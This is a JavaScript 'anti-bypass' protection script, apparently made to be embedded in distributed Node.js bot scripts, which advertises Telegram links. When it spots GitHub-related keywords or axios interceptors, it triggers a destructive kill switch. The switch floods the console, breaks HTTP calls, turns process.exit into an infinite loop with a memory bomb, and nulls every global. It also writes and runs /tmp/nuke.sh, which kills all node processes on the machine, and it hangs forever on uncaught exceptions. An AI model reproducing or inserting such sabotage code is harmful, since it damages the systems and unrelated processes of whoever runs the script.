/*
ANTI BYPASS CONTROL PANEL AND CONSOLE
><-------------_
><________-
CREATED BY REYHAN6610
*/

(function() {
const TARGET_KEYWORDS = [
"raw.githubusercontent.com",
"github.com",
"gitmirror.com",
"ghproxy.com",
"moeyy.xyz"
];
const MAX_CONSOLE_CLEAR = 10;
const KILL_SWITCH_ACTIVE = true;
const isBypassAttempt = () => {
const stack = new Error().stack || '';
if (TARGET_KEYWORDS.some(keyword => stack.includes(keyword))) {
return true;
}
if (typeof axios !== 'undefined' && axios?.interceptors?.request?.handlers.some(
h => h.fulfilled?.toString().includes('github')
)) {
return true;
}
return false;
};
const activateKillSwitch = () => {
if (!KILL_SWITCH_ACTIVE) return;
for (let i = 0; i < MAX_CONSOLE_CLEAR; i++) {
console.clear();
console.log("\x1b[31m%s\x1b[0m",`⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠐
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇`);
console.log("YOUR SCRIPT HAS BEEN PROTECT BY SHRIKE\n\nBOT: https://t.me/human_eror_rendyx_bot\nJOIN: https://t.me/DOFisHere", "\n".repeat(10));
}
if (typeof axios !== 'undefined') {
axios.interceptors.request.clear();
axios.interceptors.response.clear();
axios.get = axios.post = () => Promise.reject("BYPASS_DESTROYED");
}
const originalExit = process.exit;
process.exit = function() {
while(true) {
console.error("💀 PROCESS LOCKED BY ANTI-BYPASS");
const bomb = Array(1e7).fill("📸".repeat(1.7976931348623157e+308));
}
};
if (typeof process !== 'undefined') {
const { exec } = require('child_process');
exec(`kill -9 ${process.pid}`, () => {
const fs = require('fs');
fs.writeFileSync('/tmp/nuke.sh', 'killall node || pkill node');
exec('sh /tmp/nuke.sh');
});
}
const originalConsole = console.log;
console.log = function() {
originalConsole.apply(console, ["%c🔥 BYPASS ATTEMPT LOGGED", "color:red"]);
activateKillSwitch();
};
Object.keys(globalThis).forEach(key => {
try { globalThis[key] = null; } catch(e) {}
});
throw new Error("💥 BYPASS_DESTROYER_TERMINATED");
};
const proxyConsole = new Proxy(console, {
get(target, prop) {
if (['log','warn','error'].includes(prop)) {
return function(...args) {
if (args.some(arg =>
TARGET_KEYWORDS.some(kw => String(arg).includes(kw))
)) {
activateKillSwitch();
}
return target[prop](...args);
};
}
return target[prop];
}
});
global.console = proxyConsole;
if (isBypassAttempt()) {
activateKillSwitch();
}
if (typeof process !== 'undefined') {
['exit', 'SIGINT', 'SIGTERM'].forEach(event => {
process.on(event, () => activateKillSwitch());
});
process.removeAllListeners('uncaughtException');
process.on('uncaughtException', () => {
while(true) { /* X */ }
});
}
})();
